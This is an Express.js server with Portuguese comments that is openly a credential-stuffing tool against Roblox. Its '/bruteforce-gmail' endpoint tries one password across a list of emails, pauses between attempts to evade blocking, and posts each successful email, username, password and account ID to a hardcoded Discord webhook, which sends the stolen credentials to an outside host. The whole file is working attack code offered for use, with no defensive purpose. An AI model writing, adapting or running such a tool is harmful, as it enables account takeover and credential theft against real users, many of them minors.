const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

// SEU WEBHOOK DO DISCORD (O antigo funciona, não precisa de Bot oficial)
const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

app.use(express.json());
app.use(express.static('.'));

// Função para tentar Login no Roblox com EMAIL e SENHA
async function tryLoginWithGmail(email, password) {
    const baseUrl = "https://www.roblox.com";
    const robloxClient = axios.create({
        baseURL: baseUrl,
        timeout: 10000,
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        }
    });

    try {
        // 1. Pega os cookies do Roblox
        await robloxClient.get('/');

        // 2. Tenta o Login
        const response = await robloxClient.post('/users/login', {
            username: email, // O Roblox aceita o Email no campo username
            password: password
        }, {
            headers: { 'Content-Type': 'application/json' },
            validateStatus: status => status < 500
        });

        const data = response.data;

        // Se retornar um ID numérico, o login funcionou!
        if (data.id && typeof data.id === 'number') {
            return {
                success: true,
                username: data.username, // O nome do usuário no Roblox
                id: data.id
            };
        }

        // Se não, retorna o erro (ex: "User not found" ou "Wrong password")
        return {
            success: false,
            error: data.error || "Erro Desconhecido"
        };

    } catch (e) {
        return {
            success: false,
            error: "Erro de Conexão ou Timeout"
        };
    }
}

// Função para enviar mensagem no Discord
async function sendToDiscord(message) {
    try {
        await axios.post(WEBHOOK_URL, { content: message });
    } catch (e) {
        console.error("Erro no Webhook:", e);
    }
}

// ENDPOINT PARA FORÇA BRUTA (LISTA DE EMAILS)
app.post('/bruteforce-gmail', async (req, res) => {
    const { list, password } = req.body;

    if (!list || !Array.isArray(list) || list.length === 0) {
        return res.json({ success: false, error: "Lista vazia" });
    }

    if (!password) {
        return res.json({ success: false, error: "Falta a Senha" });
    }

    const results = [];
    let foundCount = 0;

    // Limitamos a 10 por vez para não travar o servidor gratuito do Render
    const maxChecks = list.slice(0, 10);

    for (const email of maxChecks) {
        const cleanEmail = email.trim();
        
        console.log(`Testando: ${cleanEmail}...`);

        const result = await tryLoginWithGmail(cleanEmail, password);

        if (result.success) {
            foundCount++;
            results.push({
                status: "FOUND",
                email: cleanEmail,
                robloxUsername: result.username,
                robloxId: result.id
            });

            // Envia alerta no Discord
            const msg = `**🔥 CONTA ENCONTRADA NO ROBLOX!**\n**Email:** ${cleanEmail}\n**Usuário:** ${result.username}\n**Senha:** ${password}\n**ID:** ${result.id}`;
            await sendToDiscord(msg);
        } else {
            results.push({
                status: "MISSED",
                email: cleanEmail,
                error: result.error
            });
        }

        // Pausa de 1.5 segundos entre cada tentativa para não bloquear o Email
        await new Promise(r => setTimeout(r, 1500));
    }

    // Resumo no Discord
    const summary = `**📊 FIM DA VERIFICAÇÃO**\n**Testados:** ${maxChecks.length}\n**Encontrados:** ${foundCount}`;
    await sendToDiscord(summary);

    return res.json({ success: true, results: results, found: foundCount });
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
